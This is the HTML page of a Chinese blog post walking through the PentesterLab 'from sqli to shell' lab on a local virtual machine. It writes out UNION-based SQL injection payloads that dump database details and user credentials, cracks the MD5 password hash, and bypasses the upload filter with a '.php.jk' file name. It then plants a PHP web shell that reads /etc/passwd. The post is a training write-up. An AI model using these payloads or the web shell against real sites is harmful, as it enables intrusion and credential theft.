@@ -1,0 +1,278 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="chrome=1">
+
+    
+
+    <title>
+      from sqli to shell | HeartSky&#39;s blog 
+    </title>
+
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    
+      <meta name="author" content="HeartSky">
+    
+    
+
+    <meta name="description" content="无聊去做了下pentesterlab里的一个from sqli to shell实验，下载完镜像文件后，安装在虚拟机里，ifconfig查看下IP地址，然后在本机浏览器里输上地址就可以打开了 探测信息打开是这样的先F12查看一下，获得了以下信息12服务端语言 PHP/5.3.3-7+squeeze14服务器     Apache/2.2.16 (Debian) 这里说一下，squeeze是Debi">
+<meta name="keywords" content="SQLi,Pentest">
+<meta property="og:type" content="article">
+<meta property="og:title" content="from sqli to shell | HeartSky&#39;s blog">
+<meta property="og:url" content="http://heartsky.info/2016/08/02/from-sqli-to-shell/index.html">
+<meta property="og:site_name" content="HeartSky&#39;s blog">
+<meta property="og:description" content="无聊去做了下pentesterlab里的一个from sqli to shell实验，下载完镜像文件后，安装在虚拟机里，ifconfig查看下IP地址，然后在本机浏览器里输上地址就可以打开了 探测信息打开是这样的先F12查看一下，获得了以下信息12服务端语言 PHP/5.3.3-7+squeeze14服务器     Apache/2.2.16 (Debian) 这里说一下，squeeze是Debi">
+<meta property="og:image" content="http://7xqn7l.com1.z0.glb.clouddn.com/image/from_sqli_to_shell/image1.png">
+<meta property="og:image" content="http://7xqn7l.com1.z0.glb.clouddn.com/image/from_sqli_to_shell/image2.png">
+<meta property="og:image" content="http://7xqn7l.com1.z0.glb.clouddn.com/image/from_sqli_to_shell/image3.png">
+<meta property="og:image" content="http://7xqn7l.com1.z0.glb.clouddn.com/image/from_sqli_to_shell/image4.png">
+<meta property="og:image" content="http://7xqn7l.com1.z0.glb.clouddn.com/image/from_sqli_to_shell/image5.png">
+<meta property="og:updated_time" content="2017-11-15T06:18:36.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="from sqli to shell | HeartSky&#39;s blog">
+<meta name="twitter:description" content="无聊去做了下pentesterlab里的一个from sqli to shell实验，下载完镜像文件后，安装在虚拟机里，ifconfig查看下IP地址，然后在本机浏览器里输上地址就可以打开了 探测信息打开是这样的先F12查看一下，获得了以下信息12服务端语言 PHP/5.3.3-7+squeeze14服务器     Apache/2.2.16 (Debian) 这里说一下，squeeze是Debi">
+<meta name="twitter:image" content="http://7xqn7l.com1.z0.glb.clouddn.com/image/from_sqli_to_shell/image1.png">
+    
+    
+    
+      <link rel="icon" type="image/x-icon" href="/favicon.png">
+    
+    <link rel="stylesheet" href="/css/uno.css">
+    <link rel="stylesheet" href="/css/highlight.css">
+    <link rel="stylesheet" href="/css/archive.css">
+    <link rel="stylesheet" href="/css/china-social-icon.css">
+
+</head>
+<body>
+
+    <span class="mobile btn-mobile-menu">
+        <i class="icon icon-list btn-mobile-menu__icon"></i>
+        <i class="icon icon-x-circle btn-mobile-close__icon hidden"></i>
+    </span>
+
+    
+
+<header class="panel-cover panel-cover--collapsed">
+
+
+  <div class="panel-main">
+
+  
+    <div class="panel-main__inner panel-inverted">
+    <div class="panel-main__content">
+
+        
+
+        <h1 class="panel-cover__title panel-title"><a href="/" title="link to homepage">HeartSky&#39;s blog</a></h1>
+        <hr class="panel-cover__divider" />
+
+        
+        <p class="panel-cover__description">
+          在渗透之路上渐行渐远
+        </p>
+        <hr class="panel-cover__divider panel-cover__divider--secondary" />
+        
+
+        <div class="navigation-wrapper">
+
+          <nav class="cover-navigation cover-navigation--primary">
+            <ul class="navigation">
+
+              
+                
+                <li class="navigation__item"><a href="/#blog" title="" class="blog-button">首页</a></li>
+              
+                
+                <li class="navigation__item"><a href="/about" title="" class="">关于</a></li>
+              
+                
+                <li class="navigation__item"><a href="/archive" title="" class="">归档</a></li>
+              
+                
+                <li class="navigation__item"><a href="/friends" title="" class="">友链</a></li>
+              
+
+            </ul>
+          </nav>
+
+          <!-- ----------------------------
+To add a new social icon simply duplicate one of the list items from below
+and change the class in the <i> tag to match the desired social network
+and then add your link to the <a>. Here is a full list of social network
+classes that you can use:
+
+    icon-social-500px
+    icon-social-behance
+    icon-social-delicious
+    icon-social-designer-news
+    icon-social-deviant-art
+    icon-social-digg
+    icon-social-dribbble
+    icon-social-facebook
+    icon-social-flickr
+    icon-social-forrst
+    icon-social-foursquare
+    icon-social-github
+    icon-social-google-plus
+    icon-social-hi5
+    icon-social-instagram
+    icon-social-lastfm
+    icon-social-linkedin
+    icon-social-medium
+    icon-social-myspace
+    icon-social-path
+    icon-social-pinterest
+    icon-social-rdio
+    icon-social-reddit
+    icon-social-skype
+    icon-social-spotify
+    icon-social-stack-overflow
+    icon-social-steam
+    icon-social-stumbleupon
+    icon-social-treehouse
+    icon-social-tumblr
+    icon-social-twitter
+    icon-social-vimeo
+    icon-social-xbox
+    icon-social-yelp
+    icon-social-youtube
+    icon-social-zerply
+    icon-mail
+
+-------------------------------->
+
+<!-- add social info here -->
+
+
+
+        </div>
+
+      </div>
+
+    </div>
+
+    <div class="panel-cover--overlay"></div>
+  </div>
+</header>
+
+    <div class="content-wrapper">
+        <div class="content-wrapper__inner entry">
+            
+
+<article class="post-container post-container--single">
+
+  <header class="post-header">
+    
+    <h1 class="post-title">from sqli to shell</h1>
+
+    
+
+    <div class="post-meta">
+      <time datetime="2016-08-02" class="post-meta__date date">2016-08-02</time> 
+
+      <span class="post-meta__tags tags">
+
+          
+
+          
+             &#8226; 标签:
+            <font class="tags">
+              <a class="tags-link" href="/tags/Pentest/">Pentest</a>, <a class="tags-link" href="/tags/SQLi/">SQLi</a>
+            </font>
+          
+
+      </span>
+    </div>
+    
+    
+
+  </header>
+
+  <section id="post-content" class="article-content post">
+    <p>无聊去做了下pentesterlab里的一个from sqli to shell实验，下载完镜像文件后，安装在虚拟机里，ifconfig查看下IP地址，然后在本机浏览器里输上地址就可以打开了</p>
+<h2 id="探测信息"><a href="#探测信息" class="headerlink" title="探测信息"></a>探测信息</h2><p>打开是这样的<br><img src="http://7xqn7l.com1.z0.glb.clouddn.com/image/from_sqli_to_shell/image1.png" alt=""><br>先F12查看一下，获得了以下信息<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">服务端语言 PHP/5.3.3-7+squeeze14</span><br><span class="line">服务器     Apache/2.2.16 (Debian)</span><br></pre></td></tr></table></figure></p>
+<p>这里说一下，squeeze是Debian 6.0稳定版(已经被淘汰)的开发代号，后面的MySQL版本也会出现它<br>然后我们再随便点几个按钮发现存在GET请求<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.122.131/cat.php?id=1</span><br></pre></td></tr></table></figure></p>
+<p>每一个id对应一张图片，注入单引号后，错误直接爆出来了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;&apos;&apos; at line 1</span><br></pre></td></tr></table></figure></p>
+<p>这里肯定存在SQL注入了，同时确定了数据库语言为<code>MySQL</code></p>
+<hr>
+<h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><h3 id="注入类型"><a href="#注入类型" class="headerlink" title="注入类型"></a>注入类型</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.122.131/cat.php?id=1 and 1=1</span><br></pre></td></tr></table></figure>
+<p>返回与id=1相同的结果，说明是数字型注入</p>
+<h3 id="确定字段数"><a href="#确定字段数" class="headerlink" title="确定字段数"></a>确定字段数</h3><p>这里我们采用UNION查询的方式，所以要确保后面的字段数与前面的一致<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.122.131/cat.php?id=1 order by 4</span><br></pre></td></tr></table></figure></p>
+<p>order by 后面是5时返回不存在的列数，4时返回正常的结果，字段数为4，可显数据在第二列</p>
+<h3 id="爆数据库、MySQL版本、当前用户"><a href="#爆数据库、MySQL版本、当前用户" class="headerlink" title="爆数据库、MySQL版本、当前用户"></a>爆数据库、MySQL版本、当前用户</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.122.131/cat.php?id=1 union select 1,database(),3,4</span><br><span class="line">http://192.168.122.131/cat.php?id=1 union select 1,@@version,3,4</span><br><span class="line">http://192.168.122.131/cat.php?id=1 union select 1,current_user,3,4</span><br></pre></td></tr></table></figure>
+<p>获得的数据如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">photoblog</span><br><span class="line">5.1.63-0+squeeze1</span><br><span class="line">pentesterlab@localhost</span><br></pre></td></tr></table></figure></p>
+<h3 id="爆表名"><a href="#爆表名" class="headerlink" title="爆表名"></a>爆表名</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.122.131/cat.php?id=1 union select 1,table_name,3,4 from information_schema.tables where table_schema=database()</span><br></pre></td></tr></table></figure>
+<p><img src="http://7xqn7l.com1.z0.glb.clouddn.com/image/from_sqli_to_shell/image2.png" alt=""><br>没多想直接锁定目标为users表</p>
+<h3 id="爆列名"><a href="#爆列名" class="headerlink" title="爆列名"></a>爆列名</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.122.131/cat.php?id=1 union select 1,column_name,3,4 from information_schema.columns where table_schema=database() and table_name=&quot;users&quot;</span><br></pre></td></tr></table></figure>
+<p><img src="http://7xqn7l.com1.z0.glb.clouddn.com/image/from_sqli_to_shell/image3.png" alt=""><br>有三列，这里用concat()将用户名和密码连接起来，就不用查询两次了</p>
+<h3 id="爆登录用户名、密码"><a href="#爆登录用户名、密码" class="headerlink" title="爆登录用户名、密码"></a>爆登录用户名、密码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.122.131/cat.php?id=1 union select 1,concat(login,&apos;:&apos;,password),3,4 from photoblog.users</span><br></pre></td></tr></table></figure>
+<p><img src="http://7xqn7l.com1.z0.glb.clouddn.com/image/from_sqli_to_shell/image4.png" alt=""><br>密码看起来像是md5，找个解密网站解密后得到P4ssw0rd，然后就可以用它登录后台页面了</p>
+<hr>
+<h2 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h2><p>登录后有个上传图片的功能，猜测可能有文件上传漏洞，写个测试文件<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    phpinfo();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>文件后缀为.php，上传后提示NO PHP!!，应该是用了黑名单策略，因为服务器是Apache，所以我们可以利用Apache解析文件后缀时遇到不认识的会丢弃并往前找的特性，把文件后缀改为.php.jk，这样验证时文件后缀被认为是.jk，但打开文件时会被解析为.php。成功绕过，后来看了下官方题解，改为.php3也可以<br>F12找到图片路径<code>admin/uploads/123.php.jk</code><br><img src="http://7xqn7l.com1.z0.glb.clouddn.com/image/from_sqli_to_shell/image5.png" alt=""><br>可以看到文件里的代码被成功执行了<br>接下来只要利用system()函数就可以执行操作系统命令了，比如<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    system(<span class="string">'uname;'</span>);</span><br><span class="line">    system(<span class="string">'cat /etc/passwd;'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>总的来说，这个镜像很简单，基本上没有过滤，只是作为给你提供一个从SQL注入到OS命令执行的一般思路吧，正如镜像名 from sqli to shell, 初学者可以试下</p>
+
+  </section>
+
+  
+  
+</article>
+
+
+            <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+<footer class="footer">
+    <span id="busuanzi_container_page_pv">
+      本文总阅读量<span id="busuanzi_value_page_pv"></span>次
+    </span>
+<span id="busuanzi_container_site_uv">
+  本站访客数<span id="busuanzi_value_site_uv"></span>人次
+</span>
+    <span class="footer__copyright">&copy; 2016-2017. | 由<a href="https://hexo.io/">Hexo</a>强力驱动 | 主题<a href="https://github.com/someus/huno">Huno</a> | <a href="https://coding.net/u/HeartSky/p/HeartSky/git/pages">Hosted by Coding Pages</a></span>  
+</footer>
+
+        </div>
+    </div>
+
+    <!-- js files -->
+    <script src="/js/jquery.min.js"></script>
+    <script src="/js/main.js"></script>
+    <script src="/js/scale.fix.js"></script>
+    
+
+    
+
+    <script type="text/javascript" src="//cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+    <script type="text/javascript"> 
+        $(document).ready(function(){
+            MathJax.Hub.Config({ 
+                tex2jax: {inlineMath: [['$','$'],['[latex]','[/latex]'], ['\\(','\\)']]} 
+            });
+        });
+    </script>
+
+
+
+    
+
+    <script src="/js/awesome-toc.min.js"></script>
+    <script>
+        $(document).ready(function(){
+            $.awesome_toc({
+                overlay: true,
+                contentId: "post-content",
+            });
+        });
+    </script>
+
+
+    <script src="http://s11.cnzz.com/z_stat.php?id=1259147269&web_id=1259147269" language="JavaScript"></script>
+    
+    <!--kill ie6 -->
+<!--[if IE 6]>
+  <script src="//letskillie6.googlecode.com/svn/trunk/2/zh_CN.js"></script>
+<![endif]-->
+
+</body>
+</html>
